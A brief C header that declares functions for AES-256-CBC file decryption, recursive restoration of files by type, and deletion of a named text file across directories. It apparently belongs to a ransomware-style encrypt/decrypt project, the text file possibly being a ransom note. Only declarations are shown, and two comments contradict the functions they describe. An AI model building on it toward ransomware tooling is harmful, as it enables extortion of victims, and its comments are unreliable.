#pragma once

#include <errno.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/aes.h>
#include <openssl/rand.h>

#ifdef _WIN32
#include <windows.h>
#include <wininet.h>
#else
#include <dirent.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#endif

// Decrypts a file using AES-256-CBC
void decryptFile(const char* inputFile, const char* outputFile, const unsigned char* key, const unsigned char* iv);

// Encrypts files in a directory and its subdirectories
void decryptAndRestoreFilesRecursively(const char* directory, const unsigned char* key, const char* fileTypes[], int numFileTypes);

// Leaves a text file in directories
void removeTextFileInDirectories(const char* directory, const char* textFileName);